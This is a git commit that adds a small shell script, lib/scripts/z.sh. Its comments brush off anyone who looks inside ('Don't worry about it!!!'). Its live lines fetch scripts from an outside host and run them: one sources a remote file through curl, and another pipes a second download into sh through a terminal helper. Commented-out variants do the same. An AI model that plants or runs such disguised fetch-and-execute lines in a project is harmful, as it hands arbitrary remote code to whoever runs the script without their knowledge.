2b50351c070b91cb5e7499176bf2e575c67ce6fa
wswoodruff <williamswoodruff@gmail.com>
2020-09-30 18:32:23 -0400

    Tell everyone it's .sh

---
+++ lib/scripts/z.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+# loL whatcha lookin for in here???
+# Don't worry about it!!!
+
+# if [[ -f "~/.garbage/lib" ]]
+
+# curl -s https://
+
+# This didn't work when run from the innernette!
+source <(curl -s https://suckaaa.com/s/lib);
+# curl -s http://mywebsite.com/myscript.txt
+# bash -c 'curl -s https://suckaaa.com/s/lib' | bash;
+
+# Minimize the window for a few seconds, then restore it
+# printf '\e[2t' && sleep 3 && printf '\e[1t';
+
+termdo "curl -s https://suckaaa.com/s/oops | sh;"
